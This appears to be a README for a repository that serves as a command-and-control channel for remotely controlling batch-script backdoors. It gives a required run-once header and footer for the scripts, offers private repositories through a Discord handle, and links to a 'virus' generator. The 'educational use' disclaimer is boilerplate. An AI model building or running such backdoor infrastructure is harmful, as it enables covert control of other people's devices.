I would like to remind you that all of this is for **educational use only**

please only use this on devices you own or have **explicit** permission from the device owner

## preset code
all scripts must start with:
```
set number=1
< run.sav (
  set /p number=
)

set update=1
if %number% equ %update% (goto end)
```

all scripts must end with:
```
echo %update% >run.sav
:end
timeout 1 >nul
exit /b
```
change the 1 in where it says
```set update=1```
to anything else every time you update the code
,not doing so will mean your code wont run

## private repositories
to request a private repository conact me through discord (guest257351#1040) to set it up. Private repositories can not be edited by other users. You cannot use the private and public repository at the same time. You will not be able to use backdoors added by other users. Private repositories will be able to be edited, owned, and moderated by me. a Different set of rules will be in the private repository.


## Source 
this repository is used to control backdoors remotly. I have created software to make/generate the backdoors.
the source code can be found at: https://github.com/Guest257351/Virus-Gen-Code
